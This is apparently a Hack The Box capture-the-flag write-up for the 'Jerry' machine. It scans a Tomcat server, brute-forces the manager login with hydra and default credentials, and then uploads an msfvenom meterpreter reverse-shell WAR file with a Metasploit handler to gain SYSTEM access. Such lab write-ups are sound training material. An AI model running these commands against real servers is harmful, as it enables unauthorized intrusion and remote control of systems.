## ---------------->> Jerry <<--------------

// We will start with nmap scan 

    $ nmap -sV -A -Pn -T4 10.10.10.95 -p-
-------

    Nmap scan report for 10.10.10.95
    Host is up (0.19s latency).
    Not shown: 65534 filtered ports
    PORT     STATE SERVICE VERSION
    8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
    |_http-favicon: Apache Tomcat
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache-Coyote/1.1
    |_http-title: Apache Tomcat/7.0.88
    
// Navigating to http://10.10.10.95:8080/ 

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Jerry/1.png)

// Searching for interesting directories with [dirsearch](https://github.com/maurosoria/dirsearch)(By maurosoria)

    $ python3 dirsearch.py -u http://10.10.10.95:8080/ -t 100
------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

    Target: http://10.10.10.95:8080/

    [13:30:27] Starting: 
    [13:30:53] 400 -    0B  - /\..\..\..\..\..\..\..\..\..\etc\passwd[13:30:54] 400 -    0B  - /a%5c.aspx
    [13:31:20] 302 -    0B  - /docs  ->  /docs/
    [13:31:22] 200 -   19KB - /docs/
    [13:31:23] 302 -    0B  - /examples  ->  /examples/
    [13:31:23] 200 -    1KB - /examples/
    [13:31:23] 200 -    7KB - /examples/servlets/index.html
    [13:31:24] 200 -  637B  - /examples/servlets/servlet/CookieExample
    [13:31:24] 200 -  947B  - /examples/servlets/servlet/RequestHeaderExample
    [13:31:24] 200 -   21KB - /favicon.ico
    [13:31:25] 200 -  722B  - /examples/jsp/snp/snoop.jsp
    [13:31:27] 401 -    2KB - /host-manager/html
    [13:31:27] 302 -    0B  - /host-manager/  ->  /host-manager/html
    [13:31:29] 200 -   11KB - /index.jsp
    [13:31:33] 302 -    0B  - /manager  ->  /manager/
    [13:31:33] 401 -    2KB - /manager/status/all
    [13:31:34] 401 -    2KB - /manager/html
    [13:31:34] 302 -    0B  - /manager/  ->  /manager/html
    [13:31:34] 401 -    2KB - /manager/html/

    Task Completed

// Lets focus on /manager/

// Navigating to http://10.10.10.95:8080/manager/ gets us a login pop up lets try admin : admin

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Jerry/2.png)

// Its redirect us to http://10.10.10.95:8080/manager/html 'ACCESS DENIED' html page

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Jerry/3.png)

// Found a tomcat [list](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt) 

// now we can use [hydra](https://secnhack.in/hydra-a-brute-forcing-tool/) for brute force the login(Also can be done with BurpSuite Intruder)

    $ hydra -C tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
--------

    Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-13 13:52:14
    [DATA] max 16 tasks per 1 server, overall 16 tasks, 79 login tries, ~5 tries per task
    [DATA] attacking http-get://10.10.10.95:8080/manager/html
    [8080][http-get] host: 10.10.10.95   login: admin   password: admin
    [8080][http-get] host: 10.10.10.95   login: admin   password: admin
    [8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
    [8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
    1 of 1 target successfully completed, 4 valid passwords found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-13 13:52:20

// We can see its default credentials login: tomcat : s3cret

// Navigate to http-get://10.10.10.95:8080/ and click on 'Server Status' and default login credentials

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Jerry/4.png)

// Then click on 'List applications'

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Jerry/5.png)

// Rolling down we can see that we can upload .war files

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Jerry/6.png)

// Lets first make .war payload with msfvenom

    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.173 LPORT=1444 -f war -o jerry_war.war
---------

    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 510 bytes
    Final size of war file: 2444 bytes
    Saved as: jerry_war.war

// and lets see how the jsp file inside called

    $ mkdir tmp

    $ cd tmp/

    $ unzip ../jerry_war.war 

    Archive:  ../jerry_war.war
       creating: META-INF/
      inflating: META-INF/MANIFEST.MF    
       creating: WEB-INF/
      inflating: WEB-INF/web.xml         
      inflating: biemviiajpvn.jsp   

    $ ls
    META-INF  WEB-INF  biemviiajpvn.jsp

// The file called biemviiajpvn.jsp

// So lets open a listiner on Metasploit multi/handler

    msf6> use exploit/multi/handler

    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
    payload => windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lport 1444
    lport => 1444
    msf6 exploit(multi/handler) > set lhost 10.10.16.173
    lhost => 10.10.16.173

    msf6 exploit(multi/handler) > exploit -j
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.

    [*] Started reverse TCP handler on 10.10.16.173:1444 

// now opload the war file 

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Jerry/7.png)

// And navigate to http://10.10.10.95:8080/jerry_war/biemviiajpvn.jspv

    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM

// We got NT/SYSTEM !!! and the flags !

    meterpreter > pwd
    C:\Users\Administrator\Desktop\flags

    meterpreter > cat '2 for the price of 1.txt'
    user.txt
    7004dbce..................

    root.txt
    04a8b36e1.................
